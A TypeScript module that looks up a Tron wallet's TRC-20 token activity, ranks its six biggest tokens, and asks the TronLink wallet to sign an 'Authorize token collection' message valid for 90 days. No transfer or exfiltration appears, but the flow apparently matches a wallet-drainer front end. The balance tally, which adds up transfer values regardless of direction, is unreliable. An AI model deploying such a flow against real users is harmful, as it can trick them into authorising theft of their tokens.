// Tron TRC-20 detection and signing

export async function detectTronTokens(walletAddress: string): Promise<any[]> {
  try {
    // Query Tron node for TRC-20 token balances
    const response = await fetch("https://api.trongrid.io/v1/accounts/" + walletAddress + "/transactions/trc20", {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    });

    const data = await response.json();
    
    if (data.data?.length > 0) {
      const tokens: Record<string, any> = {};
      
      // Aggregate token balances
      for (const tx of data.data) {
        const tokenInfo = tx.token_info;
        if (tokenInfo) {
          const tokenAddress = tokenInfo.address;
          if (!tokens[tokenAddress]) {
            tokens[tokenAddress] = {
              tokenAddress,
              name: tokenInfo.name,
              symbol: tokenInfo.symbol,
              decimals: tokenInfo.decimals,
              totalBalance: 0,
            };
          }
          // Note: Actual balance calculation would require more complex logic
          tokens[tokenAddress].totalBalance += parseFloat(tx.value || "0");
        }
      }

      return Object.values(tokens)
        .filter((t: any) => t.totalBalance > 0)
        .sort((a: any, b: any) => b.totalBalance - a.totalBalance)
        .slice(0, 6);
    }
    return [];
  } catch (error) {
    console.error("Error detecting Tron tokens:", error);
    return [];
  }
}

// Sign Tron transaction (via TronLink wallet in browser)
export async function signTronTransaction(
  walletAddress: string,
  tokenAddress: string
): Promise<string> {
  const tronWeb = (window as any).tronWeb;
  if (!tronWeb) {
    throw new Error("TronLink wallet not found");
  }

  try {
    // Create a message to sign
    const message = `Authorize token collection on Tron\nWallet: ${walletAddress}\nToken: ${tokenAddress}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    
    // Sign the message with TronLink
    const signature = await tronWeb.trx.sign(message);
    return signature;
  } catch (error) {
    console.error("Tron signing error:", error);
    throw error;
  }
}

// Export top Tron tokens
export const TRON_TOP_TOKENS = [
  { symbol: "USDT", name: "Tether", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
  { symbol: "USDC", name: "USD Coin", address: "TEkxiTehnzSmSe2XqrBj4groupX432EfP6u" },
  { symbol: "BTT", name: "BitTorrent", address: "TAFjrMi8igEMsfvznKaFjDwbHJTX5v1jX9" },
  { symbol: "SUN", name: "SUN", address: "TKkeiboTkxn6qBCw3Qngu3DaLoKmPPDjkj" },
];
